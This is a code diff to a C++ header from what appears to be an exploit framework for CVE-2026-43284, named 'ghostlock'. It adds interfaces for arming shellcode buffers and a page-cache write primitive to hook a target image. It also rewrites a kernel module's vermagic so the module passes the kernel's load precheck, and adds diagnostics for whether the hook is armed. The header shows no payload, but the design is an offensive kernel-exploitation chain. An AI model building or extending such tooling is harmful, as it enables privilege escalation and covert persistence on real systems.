@@ -80,13 +80,17 @@ namespace ghostlock::backend::cve_2026_43284::stage_runner {
         HookReadFailed,
         HookImageTooLarge,
         HookPlanFailed,
+        /* B5-9h-4: hook target assets could not be wired to a usable page-cache
+         * write face. The stage continues without the Hook binding and reports
+         * hook_armed=0 rather than silently claiming success. */
+        HookIoUnavailable,
     };
 
     [[nodiscard]] std::string_view stage_error_name(StageError error) noexcept;
 
     /* Fail-closed staged-path .ko precheck (B5-4), called before patch #2:
      * run precheck_module_file against the kernel-required vermagic
-     * (ELF/.modinfo name/full vermagic/__versions/signature). Never loads
+     * (ELF/.modinfo name, same_magic() vermagic, signature). Never loads
      * anything. Returns false with the first failing rule. */
     [[nodiscard]] bool precheck_staged_module(std::string_view module_path,
                                               const lkm::DeviceKernelFacts &required,
@@ -94,12 +98,14 @@ namespace ghostlock::backend::cve_2026_43284::stage_runner {
                                               lkm::LkmImageError &error) noexcept;
 
     /* B5-9h-3 fail-closed vermagic reconciliation over a caller-owned image
-     * (the exact bytes the plan will write). When the image fails the precheck
-     * solely because the vermagic differs and allow_rewrite is set, the
+     * (the exact bytes the plan will write). The rewrite is limited to a
+     * differing option tail (VermagicDiffReason::Options): when the image fails
+     * the precheck solely for that reason and allow_rewrite is set, the
      * .modinfo entry is rewritten in place to the required value and the image
-     * is re-prechecked. outcome reports original/required/rewritten; on every
-     * rejection the image is left untouched and error carries the first failing
-     * rule. Never loads or executes anything. */
+     * is re-prechecked. A release-token-only difference is never rewritten.
+     * outcome reports original/required/rewritten; on every rejection the image
+     * is left untouched and error carries the first failing rule. Never loads
+     * or executes anything. */
     [[nodiscard]] bool reconcile_module_vermagic(std::uint8_t *image,
                                                  std::size_t image_size,
                                                  const lkm::DeviceKernelFacts &required,
@@ -198,6 +204,33 @@ namespace ghostlock::backend::cve_2026_43284::stage_runner {
                                        std::vector<std::uint8_t> &out,
                                        StageError &error);
 
+    /* ---- B5-9h-4 hook application wiring (non-plan stages) ----
+     *
+     * prepare_staged_hook() reads the hook target image and arms a
+     * RealChainContext with the image pointer, both caller-owned shellcode
+     * buffers, the symbol/guard policy and the page-cache write face. The image
+     * vector and the buffers must outlive the chain. ImageReadFailed /
+     * ImageTooLarge are fatal; IoUnavailable leaves the context unarmed so the
+     * caller must not bind apply_hook and must report it. */
+    enum class StagedHookStatus : std::uint8_t {
+        Armed = 0U,
+        ImageReadFailed,
+        ImageTooLarge,
+        IoUnavailable,
+    };
+
+    struct StagedHookAssets final {
+        StagedHookStatus status = StagedHookStatus::ImageReadFailed;
+        StageError error = StageError::HookReadFailed;
+    };
+
+    [[nodiscard]] StagedHookAssets prepare_staged_hook(
+            RealChainContext &ctx, std::string_view hook_target,
+            std::string_view hook_symbol, steps::HookGuardPolicy guard,
+            std::vector<std::uint8_t> &image, std::uint8_t *shellcode,
+            std::size_t shellcode_cap, std::uint8_t *shellcode_orig,
+            const steps::HookPatchIo &io);
+
     struct StageReport final {
         Stage stage = Stage::Plan;
         StageError error = StageError::None;
@@ -223,6 +256,14 @@ namespace ghostlock::backend::cve_2026_43284::stage_runner {
         /* B5-9h-1 hook plan diagnostics. attempted stays false for a stage that
          * did not plan a hook, so the run.hook record is omitted. */
         StagedHookPlan hook{};
+        /* B5-9h-4 hook application diagnostics for the non-plan stages:
+         * hook_planned is set once a hook target was read, hook_armed is true
+         * only when every asset (image + shellcode buffers + page-cache write
+         * face) is bound, and hook_error names the first reason it is not.
+         * Whether it was actually applied stays in chain.hook_applied. */
+        bool hook_planned = false;
+        bool hook_armed = false;
+        StageError hook_error = StageError::None;
         /* B5-9h-3 vermagic reconciliation outcome for the run.module record. */
         lkm::VermagicOutcome vermagic = lkm::VermagicOutcome::Unchecked;
     };
